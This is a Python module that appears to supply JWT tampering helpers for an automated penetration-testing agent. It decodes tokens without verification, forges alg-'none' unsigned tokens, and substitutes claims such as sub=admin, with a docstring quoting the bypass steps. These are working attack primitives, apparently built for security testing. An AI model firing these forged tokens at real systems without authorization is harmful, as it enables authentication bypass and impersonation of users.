"""JWT decode/tamper helpers — pure, zero-I/O.

A reference exploitation prompt's own attack-pattern section (`exploit-auth.txt`,
read in full for this phase) states the alg-none technique verbatim: "Capture a
JWT. Decode the header and payload. Change header alg to none. Change payload
data (e.g., sub to admin). Re-encode (without signature part) and send in
request." These functions are the pure primitives for exactly that — what the
agent does with a tampered token (which request to fire it in, whether it
worked) is the agent's own judgment call via the ordinary ``http`` tool, not
baked in here. Kept deliberately optional/callable helpers, not a detector:
they never decide anything is vulnerable, they just produce a candidate token.
"""

from __future__ import annotations

import base64
import json
from dataclasses import dataclass
from typing import Any

from ..core.errors import JwtMalformedError


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    try:
        return base64.urlsafe_b64decode(segment + padding)
    except ValueError as exc:
        raise JwtMalformedError(f"invalid base64url segment: {exc}") from exc


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _load_json_object(blob: bytes, which: str) -> dict[str, Any]:
    try:
        data = json.loads(blob)
    except (json.JSONDecodeError, UnicodeDecodeError) as exc:
        raise JwtMalformedError(f"invalid JSON in {which}: {exc}") from exc
    if not isinstance(data, dict):
        raise JwtMalformedError(f"{which} is not a JSON object")
    return data


@dataclass(frozen=True)
class DecodedJwt:
    header: dict[str, Any]
    payload: dict[str, Any]
    signature: str


def jwt_decode(token: str) -> DecodedJwt:
    """Decode a JWT's header and payload without verifying the signature."""
    parts = token.split(".")
    if len(parts) != 3:
        raise JwtMalformedError(f"expected 3 dot-separated segments, got {len(parts)}")
    header_b, payload_b, signature = parts
    header = _load_json_object(_b64url_decode(header_b), "header")
    payload = _load_json_object(_b64url_decode(payload_b), "payload")
    return DecodedJwt(header=header, payload=payload, signature=signature)


def jwt_alg_none(token: str) -> str:
    """A tampered token with ``alg: none`` and no signature — the classic bypass attempt."""
    decoded = jwt_decode(token)
    header = {**decoded.header, "alg": "none"}
    header_b = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b = _b64url_encode(json.dumps(decoded.payload, separators=(",", ":")).encode("utf-8"))
    return f"{header_b}.{payload_b}."


def jwt_with_claim(token: str, claim: str, value: Any) -> str:
    """A token with one payload claim substituted; header and signature copied verbatim.

    The copied signature will not validate against the tampered payload
    unless combined with :func:`jwt_alg_none` or a cracked/leaked signing
    secret — that combination is the agent's own call, not this function's.
    """
    decoded = jwt_decode(token)
    payload = {**decoded.payload, claim: value}
    header_b = _b64url_encode(json.dumps(decoded.header, separators=(",", ":")).encode("utf-8"))
    payload_b = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{header_b}.{payload_b}.{decoded.signature}"
